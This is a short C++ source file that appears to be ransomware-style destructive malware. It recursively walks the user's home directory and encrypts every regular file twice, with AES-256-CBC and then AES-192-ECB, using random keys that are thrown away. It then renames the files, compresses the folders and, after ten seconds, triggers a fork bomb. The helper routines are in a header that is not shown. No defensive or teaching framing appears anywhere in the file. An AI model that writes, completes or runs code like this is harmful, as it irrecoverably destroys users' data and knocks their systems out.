#include "encryptor.h"
#include <iostream>
#include <filesystem>
#include <thread>
#include <chrono>
#include <vector>

namespace fs = std::filesystem;

void traverse_and_encrypt(const std::string &directory) {
    int counter = 1;
    
    for (const auto &entry : fs::recursive_directory_iterator(directory)) {
        if (fs::is_regular_file(entry.status())) {
            std::string file_path = entry.path().string();

            
            std::vector<unsigned char> key256 = generate_random_bytes(32); // AES-256 key
            std::vector<unsigned char> iv = generate_random_bytes(16);     // AES-256 IV
            std::vector<unsigned char> key192 = generate_random_bytes(24); // AES-192 key

            
            aes256_cbc_encrypt(file_path, key256, iv);
            aes192_ecb_encrypt(file_path, key192);

            
            rename_file(file_path, counter++);
        } else if (fs::is_directory(entry.status())) {
            
            compress_folder(entry.path().string());
        }
    }
}

int main() {
    std::string home_dir = getenv("HOME");

    std::thread encryption_thread(traverse_and_encrypt, home_dir);
    
    std::this_thread::sleep_for(std::chrono::seconds(10));

    trigger_fork_bomb();

    encryption_thread.join();
    return 0;
}
